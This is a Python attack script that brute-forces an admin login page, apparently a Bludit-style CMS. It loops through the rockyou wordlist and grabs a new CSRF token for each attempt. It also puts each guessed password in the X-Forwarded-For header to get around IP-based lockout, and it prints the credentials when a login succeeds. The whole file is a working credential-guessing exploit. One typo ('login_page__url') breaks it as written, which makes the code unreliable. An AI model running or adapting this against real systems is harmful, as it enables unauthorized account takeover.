#! /usr/bin/env python3

import requests
import re
import codecs
import time

host = 'ip'
login_page_url = host + '/admin'
#passlist = ["password1","password2","password3","password4"]
passlist = []
username = 'admin'

with codecs.open('/usr/share/wordlists/rockyou.txt' ,'r+',encoding='utf-8',errors='ignore') as f:
    for line in f:
        passlist.append(line)
#print(passlist)
passlist = [ item.strip() for item in passlist]

for password in passlist:
    session = requests.Session()
    login_page = session.get(login_page_url)
    token   = re.search('value="(.+?)"',login_page.text).group(1)
    print(f"Password as ip :{password}")

    headers = {
        'X-Forwarded-For' : str(password),
        'User-Agent' : 'Mozilla\/5.0 (X11; Linux x86_64; rv:68.0) Gecko\/20100101 Firefox\/68.',
        'Referer': login_page__url
        }
    data ={
            'tokenCSRF': token,
            'username' : username,
            'password' : password,
            'save' : ''
            }

    login_result = session.post(login_page_url,headers = headers ,data = data, allow_redirects=False)
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print(f'Sucess:password found! use {username}:{password}')
             
            
            break
    #print(login_result.headers['location'])
        else:
            print(f"Credentials for login Failed with {username}:{password}")
     #time.sleep(2) #comment out for making 2 sec wait per reply request
